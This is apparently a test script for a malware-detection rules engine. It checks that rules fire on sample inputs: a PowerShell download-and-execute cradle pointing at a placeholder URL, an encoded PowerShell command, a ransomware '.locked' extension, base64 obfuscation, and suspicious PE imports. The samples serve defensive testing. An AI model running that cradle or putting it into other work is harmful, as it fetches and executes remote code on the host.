# scripts/_verify_rules_engine.py
import os, sys, hashlib, tempfile
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)

from zhuzhu_Copilot.core.security_engine.rules import RuleEngine

eng = RuleEngine()
check("默认规则库加载", len(eng._rules) >= 8, f"rules={len(eng._rules)}")

# pattern 匹配器：脚本类规则
hits = eng.match({"kind": "script", "script": 'IEX (New-Object Net.WebClient).DownloadString("http://x/a")'},
                 category="script")
check("脚本无文件攻击规则命中", len(hits) >= 1, str([r.get("id") for r, _ in hits][:3]))
conf = eng.confidence({"kind": "script", "script": 'IEX (New-Object Net.WebClient).DownloadString("http://x/a")'},
                      category="script")
check("脚本无文件攻击置信度>=80", conf >= 80, str(conf))

# cmdline-regex 匹配器
hits = eng.match({"kind": "command", "cmdline": "powershell -EncodedCommand SFRUUA==",
                  "exe_name": "powershell.exe"}, category="command")
check("命令编码执行规则命中", len(hits) >= 1, str([r.get("id") for r, _ in hits]))

# extension 匹配器
hits = eng.match({"kind": "file", "name": "a.locked", "ext": ".locked"}, category="file")
check("勒索扩展名规则命中", len(hits) >= 1, str([r.get("id") for r, _ in hits]))

# ratio + length 组合（混淆检测）
big_b64 = "QWJD" * 80
hits = eng.match({"kind": "script", "script": big_b64}, category="script")
conf = eng.confidence({"kind": "script", "script": big_b64}, category="script")
check("base64 混淆高占比命中", conf >= 50, f"conf={conf}")

# hash 匹配器（运行期添加规则，验证 matcher 通路）
tmp = tempfile.mkdtemp(prefix="rules_")
data = os.urandom(64)
path = os.path.join(tmp, "x.bin")
with open(path, "wb") as f:
    f.write(data)
sha = hashlib.sha256(data).hexdigest()
eng.add_rule({"id": "hash.test", "category": "file", "confidence": 100,
              "matchers": [{"type": "hash", "params": {"sha256": [sha]}}]})
hits = eng.match({"kind": "file", "sha256": sha}, category="file")
check("哈希匹配器命中", any(r.get("id") == "hash.test" for r, _ in hits))
check("哈希匹配器不误报", not eng.match({"kind": "file", "sha256": "0" * 64}, category="file"))
os.remove(path); os.rmdir(tmp)

# pe-import 匹配器
hits = eng.match({"kind": "file", "imports": ["kernel32.dll!virtualalloc", "advapi32.dll"]},
                 category="file")
check("导入表可疑函数命中", len(hits) >= 1, str([r.get("id") for r, _ in hits]))

# action_policy 外置读取
check("处置策略读取", int(eng.policy.get("high", 0)) >= 50, str(eng.policy))

print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)